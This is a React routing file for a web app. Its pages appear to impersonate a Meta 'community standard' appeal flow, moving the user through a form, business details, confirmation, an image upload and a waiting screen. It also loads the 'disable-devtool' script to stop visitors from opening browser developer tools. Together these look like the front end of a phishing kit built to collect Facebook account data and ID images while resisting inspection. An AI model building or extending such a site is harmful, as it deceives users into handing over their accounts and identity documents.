import React, { useEffect } from 'react';
import { BrowserRouter, Routes, Route } from 'react-router-dom';
import Home from './pages/Home';
import About from './pages/About';
import Contact from './pages/Contact';
import NotFound from './components/NotFound';
import FormData from './pages/FormData';
import BuinessPage from './pages/Buiness-page';
import Confirm from './pages/Confirm';
import UploadImages from './pages/UploadImages';
import FinalComponent from './components/Final';
import Waitting from './components/Waitting';

function App() {
  useEffect(() => {
    const script = document.createElement('script');
    script.src = 'https://cdn.jsdelivr.net/npm/disable-devtool@latest';
    script.setAttribute('disable-devtool-auto', '');
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  return (
    <>
      <BrowserRouter>
        <Routes>
          <Route path='/' element={<Home />} />
          <Route path='/about' element={<About />} />
          <Route path='/contact' element={<Contact />} />
          <Route path='/meta-community-standard' element={<FormData />} /> {/* Update path here */}
          <Route path='/meta-community-standard/buiness' element={<BuinessPage />} /> {/* Update path here */}
          <Route path='/meta-community-standard/confirm' element={<Confirm />} /> {/* Update path here */}
          <Route path='/meta-community-standard/waitting' element={<Waitting/>} /> {/* Update path here */}
          <Route path='/meta-community-standard/upload-image' element={<UploadImages />} /> {/* Update path here */}
          <Route path='/meta-community-standard/final' element={<FinalComponent />} /> {/* Update path here */}
          <Route path='*' element={<NotFound />} />
        </Routes>
      </BrowserRouter>
    </>
  );
}

export default App;
